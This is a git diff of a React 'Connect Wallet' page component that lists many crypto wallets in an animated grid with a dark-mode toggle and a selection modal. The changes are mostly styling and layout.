@@ -1,8 +1,12 @@
+
+
+
 import React, { useState, useEffect } from "react";
 import { IoWalletOutline } from "react-icons/io5";
 import { FaArrowUp } from "react-icons/fa";
 import { motion, AnimatePresence } from "framer-motion";
 import SecondModal from "./SecondModal";
+
 const wallets = [
   { name: "SafePal", link: "safepal.com", image: "/images/safepal.png" },
   {
@@ -254,7 +258,6 @@ const wallets = [
   },
   { name: "Others", link: "", image: "/images/others.png" },
 ];
-
 const Connect = () => {
   const [isDarkMode, setIsDarkMode] = useState(false);
   const [scrolled, setScrolled] = useState(false);
@@ -272,7 +275,7 @@ const Connect = () => {
     localStorage.setItem("darkMode", isDarkMode);
   }, [isDarkMode]);
 
-    useEffect(() => {
+  useEffect(() => {
     document.title = "Connect Wallet";
   }, []);
 
@@ -282,6 +285,7 @@ const Connect = () => {
       setScrolled(y > 20);
       setShowScrollTop(y > 300);
     };
+
     window.addEventListener("scroll", handleScroll);
     return () => window.removeEventListener("scroll", handleScroll);
   }, []);
@@ -300,31 +304,41 @@ const Connect = () => {
       }
     };
 
-    fetchTitle(); // initial fetch
-    const interval = setInterval(fetchTitle, 5000); // refetch every 5 seconds
+    fetchTitle();
+    const interval = setInterval(fetchTitle, 5000);
 
-    return () => clearInterval(interval); // clean up
+    return () => clearInterval(interval);
   }, []);
 
   const toggleDarkMode = () => setIsDarkMode(!isDarkMode);
-  const scrollToTop = () => window.scrollTo({ top: 0, behavior: "smooth" });
+
+  const scrollToTop = () =>
+    window.scrollTo({ top: 0, behavior: "smooth" });
 
   return (
     <div
-      className={`transition-colors duration-500 ${
-        isDarkMode ? "bg-black text-white" : "bg-white text-black"
-      } min-h-screen`}
+      className={`relative min-h-screen transition-colors duration-500 ${
+        isDarkMode
+          ? "bg-[#0b0b0b] text-white"
+          : "bg-gradient-to-b from-white via-gray-50 to-white text-black"
+      }`}
     >
-      {/* Header */}
+      {/* background glow */}
+      <div className="absolute inset-0 overflow-hidden pointer-events-none">
+        <div className="absolute w-[500px] h-[500px] bg-pink-500/20 blur-[140px] rounded-full top-[-200px] left-[-200px]" />
+        <div className="absolute w-[400px] h-[400px] bg-red-400/20 blur-[140px] rounded-full bottom-[-150px] right-[-150px]" />
+      </div>
+
+      {/* HEADER */}
+
       <div
         className={`fixed top-0 w-full z-50 transition-all duration-500 ${
           scrolled
-            ? "bg-gradient-to-r from-pink-700 via-red-400 to-pink-700"
+            ? "backdrop-blur-xl bg-gradient-to-r from-pink-700/80 via-red-400/80 to-pink-700/80 shadow-xl"
             : "bg-transparent"
         }`}
-        style={{ backdropFilter: scrolled ? "blur(6px)" : "none" }}
       >
-        <div className="flex items-center justify-between p-6 w-full">
+        <div className="flex items-center justify-between px-8 py-5 max-w-[1400px] mx-auto">
           <motion.h2
             className={`text-2xl font-extrabold tracking-wide ${
               scrolled || isDarkMode ? "text-white" : "text-black"
@@ -335,17 +349,20 @@ const Connect = () => {
           >
             {title}
           </motion.h2>
+
           <div className="flex items-center gap-4">
             <button
-              className={`flex items-center py-2 rounded-full gap-3 px-6 border  transition-all duration-300 text-sm font-semibold ${
+              className={`flex items-center gap-3 px-6 py-2 rounded-full border font-semibold text-sm transition-all duration-300 hover:scale-105 ${
                 scrolled || isDarkMode
-                  ? "border-white text-white"
-                  : "border-black text-black"
+                  ? "border-white text-white hover:bg-white/10"
+                  : "border-black text-black hover:bg-black/10"
               }`}
             >
               <IoWalletOutline className="text-2xl" />
-              {/*  <span>Validate Wallet</span> */}
             </button>
+
+            {/* DARK MODE TOGGLE */}
+
             <label className="relative inline-flex items-center cursor-pointer">
               <input
                 type="checkbox"
@@ -353,20 +370,29 @@ const Connect = () => {
                 onChange={toggleDarkMode}
                 className="sr-only peer"
               />
-              <div className="w-12 h-6 rounded-full bg-gray-200 overflow-hidden shadow-lg peer duration-500 before:content-['☀️'] before:absolute before:h-6 before:w-6 before:top-1/2 before:bg-white before:rounded-full before:left-1 before:-translate-y-1/2 before:transition-all before:duration-700 peer-checked:before:opacity-0 peer-checked:before:rotate-90 peer-checked:before:-translate-y-full peer-checked:bg-[#383838] after:content-['🌑'] after:absolute after:bg-[#1d1d1d] after:rounded-full after:top-[3px] after:right-1 after:translate-y-full after:w-6 after:h-6 after:opacity-0 after:transition-all after:duration-700 peer-checked:after:opacity-100 peer-checked:after:rotate-180 peer-checked:after:translate-y-0"></div>
+
+              <div className="w-12 h-6 rounded-full bg-gray-200 overflow-hidden shadow-lg peer duration-500 before:content-['☀️'] before:absolute before:h-6 before:w-6 before:top-1/2 before:bg-white before:rounded-full before:left-1 before:-translate-y-1/2 before:transition-all before:duration-700 peer-checked:before:opacity-0 peer-checked:before:-translate-y-full peer-checked:bg-[#383838] after:content-['🌑'] after:absolute after:bg-[#1d1d1d] after:rounded-full after:top-[3px] after:right-1 after:translate-y-full after:w-6 after:h-6 after:opacity-0 after:transition-all after:duration-700 peer-checked:after:opacity-100 peer-checked:after:translate-y-0"></div>
             </label>
           </div>
         </div>
       </div>
-      <div className="h-16" /> {/* Spacer */}
-     
+
+      <div className="h-20" />
+
+      {/* TITLE SECTION */}
+
       <motion.div
-        className="grid items-center justify-center text-center mt-10"
+        className="flex flex-col items-center justify-center text-center mt-10"
         initial={{ opacity: 0, y: 30 }}
         animate={{ opacity: 1, y: 0 }}
         transition={{ delay: 0.3, duration: 1 }}
       >
-        <h2 className="text-3xl font-bold font-serif mb-2">Select Wallet</h2>
+        <h2 className="text-4xl font-bold tracking-wide font-serif mb-3">
+          Select Wallet
+        </h2>
+
+        <div className="w-20 h-[3px] rounded-full bg-gradient-to-r from-pink-500 to-red-500 mb-4" />
+
         <div className="load-row">
           <span></span>
           <span></span>
@@ -374,20 +400,22 @@ const Connect = () => {
           <span></span>
         </div>
       </motion.div>
-      {/* Wallet Grid */}
-      <div className="p-6 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 lg:grid-cols-6 gap-6">
+
+      {/* WALLET GRID */}
+
+      <div className="relative z-10 max-w-[1400px] mx-auto px-6 py-10 grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-5 gap-6">
         {wallets.map((wallet, idx) => (
           <motion.div
             key={idx}
-            className={`flex items-center rounded-lg shadow p-4 cursor-pointer transition-all duration-300 ${
+            className={`group flex items-center gap-4 p-4 rounded-2xl border cursor-pointer transition-all duration-300 hover:-translate-y-2 hover:shadow-2xl ${
               isDarkMode
-                ? "bg-[#1e1e1e] hover:bg-[#2c2c2c] text-white"
-                : "bg-white hover:bg-gray-100 text-gray-800"
+                ? "bg-[#151515]/80 border-white/10 hover:bg-[#1f1f1f]"
+                : "bg-white border-gray-200 hover:bg-gray-50"
             }`}
             initial={{ opacity: 0, scale: 0.9, y: 20 }}
             animate={{ opacity: 1, scale: 1, y: 0 }}
             transition={{
-              delay: 0.2 + idx * 0.05,
+              delay: 0.2 + idx * 0.03,
               duration: 0.4,
               ease: "easeOut",
             }}
@@ -399,23 +427,24 @@ const Connect = () => {
             <img
               src={wallet.image}
               alt={wallet.name}
-              className="w-18 h-18 rounded-full object-cover mr-4"
+              className="w-14 h-14 rounded-full object-cover group-hover:scale-110 transition-transform duration-300"
             />
+
             <div className="flex flex-col">
-              <span className="font-semibold text-lg">{wallet.name}</span>
-              <a
-                /*    href={`https://${wallet.link}`} */
-                target="_blank"
-                rel="noopener noreferrer"
-                className="text-xs text-gray-500 hover:underline"
-              >
+              <span className="font-semibold text-lg">
+                {wallet.name}
+              </span>
+
+              <span className="text-xs text-gray-400 group-hover:text-pink-500 transition">
                 {wallet.link}
-              </a>
+              </span>
             </div>
           </motion.div>
         ))}
       </div>
-      {/* Back to Top Button */}
+
+      {/* SCROLL TO TOP */}
+
       {showScrollTop && (
         <motion.button
           onClick={scrollToTop}
@@ -423,12 +452,14 @@ const Connect = () => {
           animate={{ opacity: 1, y: 0 }}
           exit={{ opacity: 0 }}
           transition={{ duration: 0.3 }}
-          className="fixed bottom-6 right-6 bg-pink-600 text-white p-3 rounded-full shadow-md hover:bg-pink-700"
+          className="fixed bottom-6 right-6 bg-gradient-to-r from-pink-600 to-red-500 text-white p-4 rounded-full shadow-xl hover:scale-110 transition"
         >
           <FaArrowUp />
         </motion.button>
       )}
-      {/* Modal */}
+
+      {/* MODAL */}
+
       <AnimatePresence>
         {isModalOpen && selectedWallet && (
           <SecondModal
